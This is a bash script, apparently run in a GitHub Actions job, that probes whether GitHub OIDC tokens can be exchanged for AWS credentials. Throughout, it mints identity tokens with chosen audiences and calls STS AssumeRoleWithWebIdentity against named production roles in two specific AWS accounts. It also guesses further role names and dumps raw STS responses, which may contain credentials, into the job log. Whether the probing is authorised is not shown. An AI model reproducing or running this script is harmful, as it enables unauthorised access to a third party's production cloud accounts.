#!/usr/bin/env bash
# intent 222849 round3 — pinpoint whether 602675409103 has a GitHub OIDC provider (aud=https://github.com/coingate)
# and read 533852667875 provider ClientIDList. Additive, read-only, non-fatal. 4 STS POSTs max.
echo "######## OIDC_PROBE_222849 R3 BEGIN ########"
echo "RUN_CTX repo=${GITHUB_REPOSITORY:-} sha=${GITHUB_SHA:-} run=${GITHUB_RUN_ID:-} attempt=${GITHUB_RUN_ATTEMPT:-}"
echo "EGRESS_IP1=$(curl -s --max-time 15 https://api.ipify.org || echo n/a)"
echo "URL_LEN=${#ACTIONS_ID_TOKEN_REQUEST_URL} TOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
echo "URL_TAIL=$(python3 -c 'import sys,urllib.parse;u=sys.argv[1];print(urllib.parse.urlparse(u).query[:200])' "$ACTIONS_ID_TOKEN_REQUEST_URL")"

mint_resp() { # $1 aud -> echoes raw body
  aud="$1"
  if [ -z "$aud" ]; then
    curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}" 2>&1 || true
  else
    enc=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=""))' "$aud")
    curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${enc}" 2>&1 || true
  fi
}

mint_token() {
  mint_resp "$1" | python3 -c 'import sys,json
raw=sys.stdin.read()
try:
    d=json.loads(raw); print(d.get("value") or "")
except Exception:
    print("")'
}

sts_raw() { # $1 aud, $2 role, $3 token, $4 label
  code=$(curl -sS --max-time 25 -o /tmp/sts_body_r3.xml -w "%{http_code}" -X POST "https://sts.amazonaws.com/" \
    -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8" \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
    --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=$2" \
    --data-urlencode "RoleSessionName=ghoidc222849r3" \
    --data-urlencode "WebIdentityToken=$3" \
    --data-urlencode "DurationSeconds=1800" 2>/dev/null || echo curl_err)
  echo "STS_RESULT[$4] aud=$1 role=$2 http=${code}"
  echo "STS_BODY[$4] :: $(tr '\n' ' ' < /tmp/sts_body_r3.xml 2>/dev/null | head -c 1700)"
  sleep 1
}

sts_try() { # $1 aud, $2 role, $3 label
  jwt=$(mint_token "$1")
  if [ -z "$jwt" ]; then
    echo "STS_RESULT[$3] aud=$1 role=$2 SKIP_no_jwt raw=$(mint_resp "$1" | head -c 300)"
    return 0
  fi
  sts_raw "$1" "$2" "$jwt" "$3"
}

echo "######## R3-1: aud=https://github.com/coingate (BUG reproduction + raw body) ########"
RAW=$(mint_resp "https://github.com/coingate")
echo "MINT_RAW[https://github.com/coingate]=$(printf '%s' "$RAW" | head -c 400)"
JWT=$(printf '%s' "$RAW" | python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("value") or "")
except Exception: print("")')
echo "MINT_LEN[https://github.com/coingate]=${#JWT}"
if [ -n "$JWT" ]; then
  echo "MINT_CLAIMS=$(printf '%s' "$JWT" | python3 -c 'import sys,json,base64
t=sys.stdin.read().strip(); p=t.split(".")[1]; p+="="*(-len(p)%4)
d=json.loads(base64.urlsafe_b64decode(p)); print(json.dumps({k:d.get(k) for k in ("iss","sub","aud","exp","iat","nbf")},sort_keys=True))')"
  sts_raw "https://github.com/coingate" "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-role-prod" "$JWT" "6026-coingate-url-aud"
  sts_raw "https://github.com/coingate" "arn:aws:iam::533852667875:role/cg-testas-app-prod-tasks" "$JWT" "5338-coingate-url-aud"
fi

echo "######## R3-2: 533852667875 final name guesses (aud=sts.amazonaws.com) ########"
for n in cg-oidc-role-prod cg-ci-role-prod; do
  sts_try "sts.amazonaws.com" "arn:aws:iam::533852667875:role/${n}" "5338-name-${n}"
done
echo "######## OIDC_PROBE_222849 R3 END ########"
exit 0
